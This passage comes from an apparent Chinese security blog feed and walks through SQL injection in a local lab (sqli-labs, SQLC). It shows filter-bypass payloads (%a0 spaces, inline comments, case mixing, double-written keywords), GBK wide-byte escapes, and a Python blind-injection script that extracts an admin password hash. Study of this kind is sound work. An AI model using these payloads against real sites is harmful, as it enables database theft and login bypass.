&lt;li&gt;&lt;code&gt;%a0&lt;/code&gt; 空格&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/**/&lt;/code&gt;也是一种替代空格方式&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27; || (select%a0extractvalue(1,concat(0x7e,version(),0x7e))) || &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002144131652.png&#34; alt=&#34;image-20221002144131652&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;绕过一些对于select、union的限制&#34;&gt;&lt;a href=&#34;#绕过一些对于select、union的限制&#34; class=&#34;headerlink&#34; title=&#34;绕过一些对于select、union的限制&#34;&gt;&lt;/a&gt;绕过一些对于select、union的限制&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27; or 1 or &amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syntax to use near &amp;#x27;or1or&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;基于以上尝试，可以看出空格被过滤&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0or%a01%a0or%a0&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么可以有：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0order%a0by%a02&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，尝试用union select&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27; union select 1,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0union%a0select%a01,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看出，union和select被过滤&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0&amp;quot;union%a0select%a01,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002150152965.png&#34; alt=&#34;image-20221002150152965&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;绕过方式一-1&#34;&gt;&lt;a href=&#34;#绕过方式一-1&#34; class=&#34;headerlink&#34; title=&#34;绕过方式一&#34;&gt;&lt;/a&gt;绕过方式一&lt;/h3&gt;&lt;p&gt;大小写随机替换（可能需要多尝试几次）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0Union%a0seLEct%a01,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;seLEct�1,2,&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0UNion%a0seLEct%a01,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27; UNion sEleCT 1,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0UNion%a0sEleCT%a01,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002150723525.png&#34; alt=&#34;image-20221002150723525&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;绕过方式二-1&#34;&gt;&lt;a href=&#34;#绕过方式二-1&#34; class=&#34;headerlink&#34; title=&#34;绕过方式二&#34;&gt;&lt;/a&gt;绕过方式二&lt;/h3&gt;&lt;p&gt;使用内联注释绕过：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27; /*!union*/ /*!select*/ 1,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0/*!union*/%a0/*!select*/%a01,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;绕过方式三&#34;&gt;&lt;a href=&#34;#绕过方式三&#34; class=&#34;headerlink&#34; title=&#34;绕过方式三&#34;&gt;&lt;/a&gt;绕过方式三&lt;/h3&gt;&lt;p&gt;使用双写、三写绕过（和绕过方式一一样，这个也需要多次尝试）：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#在union任意位置中插入union&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;union---&amp;gt;un union ion (双写)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#在select任意位置中插入select&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select ---&amp;gt;se select lect(双写) ----&amp;gt; sese select lectlect(三写)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0ununionion%a0seseselectlectlect%a01,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002170323197.png&#34; alt=&#34;image-20221002170323197&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;宽字节注入&#34;&gt;&lt;a href=&#34;#宽字节注入&#34; class=&#34;headerlink&#34; title=&#34;宽字节注入&#34;&gt;&lt;/a&gt;宽字节注入&lt;/h2&gt;&lt;p&gt;MySQL中，当数据库编码是GBK的时候，编码可以表示中文，两个字符代表一个汉字。&lt;/p&gt;
&lt;p&gt;编码范围是：8140-FEFE&lt;/p&gt;
&lt;p&gt;其中，GB2312的编码范围是：B0A1-F7FE&lt;/p&gt;
&lt;p&gt;Less-32为例：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hint: The Query String you input is escaped as : 1\&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;The Query String you input in Hex becomes : 315c27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1&amp;#x27;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hint: The Query String you input is escaped as : 1\&amp;#x27;\&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;The Query String you input in Hex becomes : 315c275c22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以发现，我们的单引号在服务器后台被&lt;code&gt;\号&lt;/code&gt;转义了。&lt;/p&gt;
&lt;h3 id=&#34;绕过方式-2&#34;&gt;&lt;a href=&#34;#绕过方式-2&#34; class=&#34;headerlink&#34; title=&#34;绕过方式&#34;&gt;&lt;/a&gt;绕过方式&lt;/h3&gt;&lt;p&gt;观察反斜杠的hex值发现是5c，接下来我们根据GBK编码来做单引号逃逸。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;815C&lt;/code&gt;在GBK编码范围&lt;code&gt;8140-FEFE&lt;/code&gt;中，因此我们在单引号前加一个%81，令其与后台的反斜杠组成双字节被解析，从而释放出我们的单引号。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1%81&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hint: The Query String you input is escaped as : 1�\&amp;#x27; #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同理，在GBK2312里行得通吗？答案是肯定的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;B15C&lt;/code&gt;在GB2312的编码范围&lt;code&gt;B0A1-F7FE&lt;/code&gt;中，那么：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1%B1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hint: The Query String you input is escaped as : 1�\&amp;#x27; #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此就可以：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1%B1&amp;#x27; order by 3%23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1%B1&amp;#x27; order by 4%23-----报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=-1%B1&amp;#x27; union select 1,2,version()%23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:5.1.73-community&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;过滤函数绕过&#34;&gt;&lt;a href=&#34;#过滤函数绕过&#34; class=&#34;headerlink&#34; title=&#34;过滤函数绕过&#34;&gt;&lt;/a&gt;过滤函数绕过&lt;/h2&gt;&lt;p&gt;以SQLC-sql9为例&lt;/p&gt;
&lt;p&gt;输入admin、admin结果报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002173314221.png&#34; alt=&#34;image-20221002173314221&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接上BurpSuit，抓包送入Repeater&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002173445571.png&#34; alt=&#34;image-20221002173445571&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入单引号，报错&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27;&amp;amp;passwd=admin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002173656791.png&#34; alt=&#34;image-20221002173656791&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们直接送入Intruder进行特殊字符爆破，看看都过滤了哪些字符&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002174151275.png&#34; alt=&#34;image-20221002174151275&#34;&gt;&lt;/p&gt;
&lt;p&gt;将特殊字符load进来&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002174237643.png&#34; alt=&#34;image-20221002174237643&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到过滤了空格，逗号等字符【由于环境不一样可能每个人的结果不同，因此不贴图，按照没有空格和逗号展开绕过】&lt;/p&gt;
&lt;p&gt;既然没有空格，我们可以使用&lt;code&gt;小括号&lt;/code&gt;或者&lt;code&gt;%a0&lt;/code&gt;代替，这里选择&lt;code&gt;小括号&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;既然没有逗号，那么很多函数我们就用不了了，比如&lt;code&gt;substr&lt;/code&gt;、&lt;code&gt;extractvalue&lt;/code&gt;等等。&lt;/p&gt;
&lt;p&gt;但是，substr还有个特性就是substr(str from n) 表示&lt;strong&gt;从第n位到结尾截取字符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;OK，空格和逗号的问题都解决了。&lt;strong&gt;剩下就是搞定注入点&lt;/strong&gt;！！！！&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002230320006.png&#34; alt=&#34;image-20221002230320006&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们看到&lt;code&gt;返回包里有个Hint&lt;/code&gt;，由于格式是&lt;code&gt;大小写&lt;/code&gt;+&lt;code&gt;数字&lt;/code&gt;+&lt;code&gt;==&lt;/code&gt;，我们解码&lt;code&gt;Base64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002225334319.png&#34; alt=&#34;image-20221002225334319&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$query=&amp;quot;SELECT * FROM admin WHERE uname=&amp;#x27;&amp;quot;.$uname.&amp;quot;&amp;#x27;&amp;quot;;if ($row[&amp;#x27;passwd&amp;#x27;]===$passwd)&amp;#123;$_SESSION[&amp;#x27;flag&amp;#x27;] = 1;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;绕过方式-3&#34;&gt;&lt;a href=&#34;#绕过方式-3&#34; class=&#34;headerlink&#34; title=&#34;绕过方式&#34;&gt;&lt;/a&gt;绕过方式&lt;/h3&gt;&lt;p&gt;也就是说，&lt;strong&gt;uname是用单引号包裹&lt;/strong&gt;，所以我们可以用&lt;strong&gt;单引号去闭合&lt;/strong&gt;——&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;&amp;#39; = 1 = &amp;#39;&lt;/code&gt;绕过：因为&lt;code&gt;uname=&amp;#39;&amp;#39; = 1&lt;/code&gt;为假，&lt;code&gt;假 = &amp;#39;&amp;#39;&lt;/code&gt;为真&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#原理核心，和 &amp;#x27; or 1 or &amp;#x27; 异曲同工&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname=&amp;#x27;= (1) =&amp;#x27;&amp;amp;passwd=admin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#那么就可以有如下注入点：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname=&amp;#x27;= (select(1)from(admin)where(length(passwd)=32)) =&amp;#x27;&amp;amp;passwd=admin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002221112034.png&#34; alt=&#34;image-20221002221112034&#34;&gt;&lt;/p&gt;
&lt;p&gt;确定了长度，尝试考虑使用脚本爆破&lt;/p&gt;
&lt;p&gt;关键核心语句为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=  &amp;#x27;= (select(1)from(admin)where(substr((passwd)from(32))=&amp;#x27;f&amp;#x27;)) =&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#其中，32需要遍历，&amp;#x27;f&amp;#x27;也需要遍历&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#注意，由于使用了substr + from的方式，因此需要&amp;quot;从后向前&amp;quot;盲推字符&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;附上脚本：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：post请求中，如果参数是”uname=xxxx &amp;amp; passwd=yyyy”这样的，我们需要在python脚本中建立一个字典去匹配。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = &lt;span class=&#34;string&#34;&gt;&amp;#x27;password error!!@_@&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;words = &lt;span class=&#34;string&#34;&gt;&amp;#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-9/login.php&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;uname&amp;quot;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;passwd&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_flag&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	flag = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	temp = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; words:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;#flag:c12366feb7373bf6d869ab7d581215cf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			temp = temp[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#first reverse cf-&amp;gt;fc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			temp = temp + j   &lt;span class=&#34;comment&#34;&gt;#fcg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			temp = temp[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#second reverse gcf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload[&lt;span class=&#34;string&#34;&gt;&amp;#x27;uname&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;= (select(1)from(admin)where(substr((passwd)from(&amp;#123;&amp;#125;))=&amp;#x27;&amp;#123;&amp;#125;&amp;#x27;)) =&amp;#x27;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;((&lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;-i),temp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload[&lt;span class=&#34;string&#34;&gt;&amp;#x27;passwd&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;comment&#34;&gt;#print(payload)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			response = requests.post(url, data = payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;comment&#34;&gt;#print(response.text)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; key &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; response.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				flag = temp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;++++&amp;quot;&lt;/span&gt;,flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;comment&#34;&gt;#if not found&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			temp = flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;the flag is:&amp;quot;&lt;/span&gt;,flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_flag()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;格式为&lt;code&gt;小写&lt;/code&gt;+&lt;code&gt;数字&lt;/code&gt;，属于&lt;code&gt;md5&lt;/code&gt;加密格式&lt;/p&gt;
&lt;p&gt;那么就有www.cmd5.com&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002231016796.png&#34; alt=&#34;image-20221002231016796&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/</guid>
            <title>OrderBy注入</title>
            <link>https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Sun, 02 Oct 2022 12:59:34 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;有趣的Order-by注入&#34;&gt;&lt;a href=&#34;#有趣的Order-by注入&#34; class=&#34;headerlink&#34; title=&#34;有趣的Order by注入&#34;&gt;&lt;/a&gt;有趣的Order by注入&lt;/h1&gt;&lt;p&gt;下面介绍几个从ThreeZh1师傅那里学到的几个有趣的SQL注入&lt;/p&gt;
